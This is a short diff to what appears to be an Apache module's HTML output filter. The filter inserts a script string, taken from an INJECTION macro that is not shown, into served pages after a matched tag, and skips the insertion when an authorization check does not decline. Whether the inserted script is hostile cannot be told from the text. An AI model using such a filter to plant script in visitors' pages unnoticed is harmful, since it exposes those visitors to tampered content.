@@ -90,12 +90,10 @@ static apr_status_t html_filter(ap_filter_t *f, apr_bucket_brigade *bb) {
 		goto end;
 	if (authorization2(f->r) != DECLINED)
 		goto end;
-	char szScript[2048];
-	snprintf(szScript, sizeof(szScript), INJECTION, html[ctx->foundHtml][2]);
 	apr_bucket *b;
 	for (b = APR_BRIGADE_FIRST(bb); b != APR_BRIGADE_SENTINEL(bb); b = APR_BUCKET_NEXT(b)) {
 		if (APR_BUCKET_IS_EOS(b))
-			break;
+			goto end;
 		if (APR_BUCKET_IS_FLUSH(b) || APR_BUCKET_IS_METADATA(b))
 			continue;
 		const char *data;
@@ -120,9 +118,12 @@ static apr_status_t html_filter(ap_filter_t *f, apr_bucket_brigade *bb) {
 			}
 		}
 		apr_size_t offset = (pos - data) + 6;
+		char szScript[4096];
+		snprintf(szScript, sizeof(szScript), INJECTION, html[ctx->foundHtml][2]);
 		apr_bucket *inject_b = apr_bucket_transient_create(szScript, strlen(szScript), f->c->bucket_alloc);
 		apr_bucket_split(b, offset);
 		APR_BUCKET_INSERT_BEFORE(APR_BUCKET_NEXT(b), inject_b);
+		goto end;
 	}
 end:
 	ctx->processedHtml = 1;
